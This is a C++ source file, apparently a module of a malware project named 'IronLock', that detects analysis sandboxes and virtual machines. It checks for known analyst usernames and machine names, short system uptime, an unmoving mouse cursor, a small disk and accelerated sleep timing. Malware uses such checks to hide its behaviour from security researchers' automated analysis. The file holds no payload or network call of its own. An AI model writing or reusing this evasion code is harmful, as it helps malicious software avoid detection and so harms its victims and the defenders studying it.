#include "SandboxDetect.h"
#include <windows.h>
#include <string>
#include <vector>
#include <algorithm>

namespace IronLock::Modules::Sandbox {

bool CheckUsername() {
    wchar_t user[256];
    DWORD size = sizeof(user) / sizeof(wchar_t);
    if (GetUserNameW(user, &size)) {
        std::wstring s(user);
        std::transform(s.begin(), s.end(), s.begin(), ::towupper);
        if (s == L"SANDBOX" || s == L"VIRUS" || s == L"MALWARE" || s == L"SCHMIDTI" || s == L"JOHN-PC" || s == L"WDAGUTILITYACCOUNT")
            return true;
    }
    return false;
}

bool CheckComputerName() {
    wchar_t name[256];
    DWORD size = sizeof(name) / sizeof(wchar_t);
    if (GetComputerNameW(name, &size)) {
        std::wstring s(name);
        std::transform(s.begin(), s.end(), s.begin(), ::towupper);
        if (s.find(L"SANDBOX") != std::wstring::npos || s.find(L"DESKTOP-") != std::wstring::npos) // Desktop- is often default for VMs
            return true;
    }
    return false;
}

bool CheckUptime() {
    return GetTickCount64() < 600000; // Less than 10 minutes
}

bool CheckMouseMovement() {
    POINT p1, p2;
    GetCursorPos(&p1);
    Sleep(2000);
    GetCursorPos(&p2);
    return (p1.x == p2.x && p1.y == p2.y);
}

bool CheckDiskSpace() {
    ULARGE_INTEGER free, total, totalFree;
    if (GetDiskFreeSpaceExW(L"C:\\", &free, &total, &totalFree)) {
        return total.QuadPart < (60ULL * 1024 * 1024 * 1024);
    }
    return false;
}

bool CheckSleepAcceleration() {
    DWORD t1 = GetTickCount();
    Sleep(500);
    DWORD t2 = GetTickCount();
    return (t2 - t1) < 450;
}

bool RunAllSandboxChecks() {
    return CheckUsername() || CheckComputerName() || CheckUptime() || CheckMouseMovement() || CheckDiskSpace() || CheckSleepAcceleration();
}

} // namespace IronLock::Modules::Sandbox
